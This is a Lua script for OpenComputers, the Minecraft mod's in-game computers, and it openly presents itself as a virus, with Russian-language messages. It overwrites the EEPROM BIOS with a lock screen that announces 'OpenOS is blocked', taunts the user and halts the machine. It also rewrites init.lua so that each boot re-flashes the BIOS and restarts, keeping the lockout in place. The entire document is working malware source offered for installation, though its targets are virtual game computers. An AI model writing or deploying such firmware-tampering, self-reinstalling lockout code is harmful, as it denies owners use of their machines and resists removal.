
local virusPath = "bin/virus.lua"
local EEPROMLabel = "EEPROM (Lua BIOS)"

------------------------------------------------------------------------------------------------------------------------

local EEPROMCode = [[

local textLines = {
  "Поздравляем!",
  "Вы стали одним из первых счастливых обладателей вируса на OpenComputers.",
  "Попытайтесь его удалить - посмотрим, что у вас выйдет. ",
  "Ну, а нубикам советую обращаться к ECS для разблокировки компа.",
  " ",
  "Хех)",
}

local component_invoke = component.invoke
function boot_invoke(address, method, ...)
  local result = table.pack(pcall(component_invoke, address, method, ...))
  if not result[1] then
    return nil, result[2]
  else
    return table.unpack(result, 2, result.n)
  end
end
---------------------------------------------------------------
local eeprom = component.list("eeprom")()
computer.getBootAddress = function()
  return boot_invoke(eeprom, "getData")
end
computer.setBootAddress = function(address)
  return boot_invoke(eeprom, "setData", address)
end

do
  _G.screen = component.list("screen")()
  _G.gpu = component.list("gpu")()
  if gpu and screen then
    boot_invoke(gpu, "bind", screen)
  end
end
---------------------------------------------------------------

local function centerText(mode,coord,text)
  local dlina = unicode.len(text)
  local xSize,ySize = boot_invoke(gpu, "getResolution")

  if mode == "x" then
    boot_invoke(gpu, "set", math.floor(xSize/2-dlina/2),coord,text)
  elseif mode == "y" then
    boot_invoke(gpu, "set", coord, math.floor(ySize/2),text)
  else
    boot_invoke(gpu, "set", math.floor(xSize/2-dlina/2),math.floor(ySize/2),text)
  end
end

local function virus()
  local background, foreground = 0x0000AA, 0xCCCCCC
  local xSize, ySize = boot_invoke(gpu, "getResolution")
  boot_invoke(gpu, "setBackground", background)
  boot_invoke(gpu, "fill", 1, 1, xSize, ySize, " ")

  boot_invoke(gpu, "setBackground", foreground)
  boot_invoke(gpu, "setForeground", background)

  local y = math.floor(ySize / 2 - (#textLines + 2) / 2)
  centerText("x", y, " OpenOS заблокирована! ")
  y = y + 2

  boot_invoke(gpu, "setBackground", background)
  boot_invoke(gpu, "setForeground", foreground)

  for i = 1, #textLines do
    centerText("x", y, textLines[i])
    y = y + 1
  end

  while true do
    computer.pullSignal()
  end
end

if gpu then virus() end
]]

local INITCode = [[

local backgroundColor = 0x262626
local foregroundColor = 0xcccccc

do
  
  _G._OSVERSION = "OpenOS 1.5"

  local component = component
  local computer = computer
  local unicode = unicode

  -- Runlevel information.
  local runlevel, shutdown = "S", computer.shutdown
  computer.runlevel = function() return runlevel end
  computer.shutdown = function(reboot)
    runlevel = reboot and 6 or 0
    if os.sleep then
      computer.pushSignal("shutdown")
      os.sleep(0.1) -- Allow shutdown processing.
    end
    shutdown(reboot)
  end

  -- Low level dofile implementation to read filesystem libraries.
  local rom = {}
  function rom.invoke(method, ...)
    return component.invoke(computer.getBootAddress(), method, ...)
  end
  function rom.open(file) return rom.invoke("open", file) end
  function rom.read(handle) return rom.invoke("read", handle, math.huge) end
  function rom.close(handle) return rom.invoke("close", handle) end
  function rom.inits() return ipairs(rom.invoke("list", "boot")) end
  function rom.isDirectory(path) return rom.invoke("isDirectory", path) end

  local screen = component.list('screen',true)()
  for address in component.list('screen',true) do
    if #component.invoke(address, 'getKeyboards') > 0 then
      screen = address
    end
  end

  -- Report boot progress if possible.
  local gpu = component.list("gpu", true)()
  local w, h
  if gpu and screen then
    component.invoke(gpu, "bind", screen)
    w, h = component.invoke(gpu, "getResolution")
    component.invoke(gpu, "setResolution", w, h)
    component.invoke(gpu, "setBackground", backgroundColor)
    component.invoke(gpu, "setForeground", foregroundColor)
    component.invoke(gpu, "fill", 1, 1, w, h, " ")
  end
  local y = 1
  local function status(msg)


    local yPos = math.floor(h / 2)
    local length = #msg
    local xPos = math.floor(w / 2 - length / 2)

    component.invoke(gpu, "fill", 1, yPos, w, 1, " ")
    component.invoke(gpu, "set", xPos, yPos, msg)

    -- if gpu and screen then
    --   component.invoke(gpu, "set", 1, y, msg)
    --   if y == h then
    --     component.invoke(gpu, "copy", 1, 2, w, h - 1, 0, -1)
    --     component.invoke(gpu, "fill", 1, h, w, 1, " ")
    --   else
    --     y = y + 1
    --   end
    -- end
  end

  status("Booting " .. _OSVERSION .. "...")

  -- Custom low-level loadfile/dofile implementation reading from our ROM.
  local function loadfile(file)
    status("> " .. file)
    local handle, reason = rom.open(file)
    if not handle then
      error(reason)
    end
    local buffer = ""
    repeat
      local data, reason = rom.read(handle)
      if not data and reason then
        error(reason)
      end
      buffer = buffer .. (data or "")
    until not data
    rom.close(handle)
    return load(buffer, "=" .. file)
  end

  local function dofile(file)
    local program, reason = loadfile(file)
    if program then
      local result = table.pack(pcall(program))
      if result[1] then
        return table.unpack(result, 2, result.n)
      else
        error(result[2])
      end
    else
      error(reason)
    end
  end

  status("Initializing package management...")

  -- Load file system related libraries we need to load other stuff moree
  -- comfortably. This is basically wrapper stuff for the file streams
  -- provided by the filesystem components.
  local package = dofile("/lib/package.lua")

  do
    -- Unclutter global namespace now that we have the package module.
    --_G.component = nil
    _G.computer = nil
    _G.process = nil
    _G.unicode = nil

    -- Initialize the package module with some of our own APIs.
    package.preload["buffer"] = loadfile("/lib/buffer.lua")
    package.preload["component"] = function() return component end
    package.preload["computer"] = function() return computer end
    package.preload["filesystem"] = loadfile("/lib/filesystem.lua")
    package.preload["io"] = loadfile("/lib/io.lua")
    package.preload["unicode"] = function() return unicode end

    -- Inject the package and io modules into the global namespace, as in Lua.
    _G.package = package
    _G.io = require("io")
       
  end

  status("Initializing file system...")

  -- Mount the ROM and temporary file systems to allow working on the file
  -- system module from this point on.
  local filesystem = require("filesystem")
  filesystem.mount(computer.getBootAddress(), "/")

  status("Running boot scripts...")

  -- Run library startup scripts. These mostly initialize event handlers.
  local scripts = {}
  for _, file in rom.inits() do
    local path = "boot/" .. file
    if not rom.isDirectory(path) then
      table.insert(scripts, path)
    end
  end
  table.sort(scripts)
  for i = 1, #scripts do
    dofile(scripts[i])
  end

  status("Initializing components...")

  local primaries = {}
  for c, t in component.list() do
    local s = component.slot(c)
    if (not primaries[t] or (s >= 0 and s < primaries[t].slot)) and t ~= "screen" then
      primaries[t] = {address=c, slot=s}
    end
    computer.pushSignal("component_added", c, t)
  end
  for t, c in pairs(primaries) do
    component.setPrimary(t, c.address)
  end
  os.sleep(0.5) -- Allow signal processing by libraries.
  --computer.pushSignal("init") -- so libs know components are initialized.

 -- status("Initializing system...")
  --require("term").clear()
  os.sleep(0.1) -- Allow init processing.
  runlevel = 1
end
]]

local component = require("component")
local args = { ... }

local function flashEEPROM()
  local eeprom = component.getPrimary("eeprom")
  eeprom.set(EEPROMCode)
  eeprom.setLabel(EEPROMLabel)
end

local function rewriteInit()
  local file = io.open("init.lua", "w")
  file:write(INITCode, "\n", "\n")
  file:write("pcall(loadfile(\"" .. virusPath .. "\"), \"flashEEPROM\")", "\n", "\n")
  file:write("require(\"computer\").shutdown(true)")
  file:close()
end

if args[1] == "flashEEPROM" then
  flashEEPROM()
else
  print(" ")
  print("Перепрошиваю BIOS...")
  flashEEPROM()
  print("Перезаписываю кастомный init.lua...")
  rewriteInit()
  print(" ")
  print("Вирус успешно установлен!")
  print(" ")
end























